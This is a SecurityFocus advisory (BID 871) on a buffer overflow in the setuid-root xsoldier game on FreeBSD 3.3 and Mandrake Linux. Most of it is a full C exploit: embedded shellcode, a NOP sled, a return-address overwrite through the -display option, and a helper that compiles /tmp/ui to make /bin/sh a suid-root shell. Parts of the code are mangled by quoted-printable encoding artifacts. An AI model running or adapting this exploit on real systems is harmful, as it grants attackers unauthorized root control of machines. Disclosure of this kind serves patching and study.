source: http://www.securityfocus.com/bid/871/info

Certain versions of FreeBSD (3.3 Confirmed) and Linux (Mandrake confirmed) ship with a vulnerable binary in their X11 games package. The binary/game in question, xsoldier, is a setuid root binary meant to be run via an X windows console.

The binary itself is subject to a buffer overflow attack (which may be launched from the command line) which can be launched to gain root privileges. The overflow itself is in the code written to handle the -display option and is possible to overflow by a user-supplied long string.

The user does not have to have a valid $DISPLAY to exploit this.

/* =

 * xsoldier exploit for Freebsd-3.3-RELEASE
 * Drops a suid root shell in /bin/sh
 * Brock Tellier btellier@usa.net
 */


#include <stdio.h>

char shell[]=3D /* mudge@l0pht.com */
  "\xeb\x35\x5e\x59\x33\xc0\x89\x46\xf5\x83\xc8\x07\x66\x89\x46\xf9"
   "\x8d\x1e\x89\x5e\x0b\x33\xd2\x52\x89\x56\x07\x89\x56\x0f\x8d\x46"
   "\x0b\x50\x8d\x06\x50\xb8\x7b\x56\x34\x12\x35\x40\x56\x34\x12\x51"
   "\x9a>:)(:<\xe8\xc6\xff\xff\xff/tmp/ui";

#define CODE "void main() { chmod (\"/bin/sh\", 0004555);}\n"

void buildui() {
FILE *fp;
  char cc[100];
  fp =3D fopen("/tmp/ui.c", "w");
  fprintf(fp, CODE);
  fclose(fp);
  snprintf(cc, sizeof(cc), "cc -o /tmp/ui /tmp/ui.c");
  system(cc);
}

main (int argc, char *argv[] ) {
 int x =3D 0;
 int y =3D 0;
 int offset =3D 0;
 int bsize =3D 4400;
 char buf[bsize];
 int eip =3D 0xbfbfdb65; /* works for me */
 buildui();

 if (argv[1]) { =

   offset =3D atoi(argv[1]);
   eip =3D eip + offset;
 }
 fprintf(stderr, "xsoldier exploit for FreeBSD 3.3-RELEASE
<btellier@usa.net>\n");
 fprintf(stderr, "Drops you a suid-root shell in /bin/sh\n");
 fprintf(stderr, "eip=3D0x%x offset=3D%d buflen=3D%d\n", eip, offset, bsi=
ze);
 =

 for ( x =3D 0; x < 4325; x++) buf[x] =3D 0x90;
     fprintf(stderr, "NOPs to %d\n", x);
 =

 for ( y =3D 0; y < 67 ; x++, y++) buf[x] =3D shell[y];
     fprintf(stderr, "Shellcode to %d\n",x);
  =

  buf[x++] =3D  eip & 0x000000ff;
  buf[x++] =3D (eip & 0x0000ff00) >> 8;
  buf[x++] =3D (eip & 0x00ff0000) >> 16;
  buf[x++] =3D (eip & 0xff000000) >> 24;
     fprintf(stderr, "eip to %d\n",x);

 buf[bsize]=3D'\0';

execl("/usr/X11R6/bin/xsoldier", "xsoldier", "-display", buf, NULL);

}
